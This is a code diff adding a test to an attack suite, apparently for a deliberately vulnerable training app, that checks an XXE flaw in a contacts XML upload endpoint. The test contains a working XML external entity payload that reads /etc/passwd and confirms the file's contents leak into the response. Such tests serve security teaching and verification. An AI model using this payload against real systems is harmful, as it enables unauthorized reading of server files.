@@ -86,6 +86,35 @@ describe('Attacks', function() {
     })
   })
 
+  describe('A4:2017 - XML External Entities (XXE)', function() {
+
+    var currentSessionId;
+
+    before('Log in to obtain valid session id', function() {
+      return chakram.post(`${URL}/api/v1/login`, {id:USERNAME, password:VALID_PASSWORD})
+        .then( response => { currentSessionId = response.body.sessionId; return expect(response.body.success).to.be.true})
+    })
+  
+    after('Log out customer to release session', function() {
+      return chakram.post(`${URL}/api/v1/logout`, {}, {headers:{sessionid:currentSessionId}})
+        .then( response => { return expect(response).to.have.status(200)})
+    })
+
+    it('Should allow XXE to extract /etc/passwd file', function() {
+      return chakram.post(`${URL}/api/v1/contacts/${USERNAME}/xml`, {contactsXml:'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY bar SYSTEM "file:///etc/passwd" >]><contacts><contact><name>Business Mike</name><iban>&bar;</iban></contact></contacts>'}, {headers:{sessionid:currentSessionId}})
+        .then( result => {
+          expect(result).to.have.status(200);
+          var response=chakram.get(`${URL}/api/v1/contacts/${USERNAME}`, {headers:{sessionid:currentSessionId}});
+          expect(response).to.have.status(200);
+          expect(response).to.have.json( json => {
+            expect(json).to.be.array;
+            expect(json[0].iban).to.match(/node:x:1000:1000::\/home\/node:\/bin\/bash/);
+          })
+          return chakram.wait();
+        })
+    })
+  })
+
   describe('A5:2017 - Broken Access Control', function() {
 
     var currentSessionId;
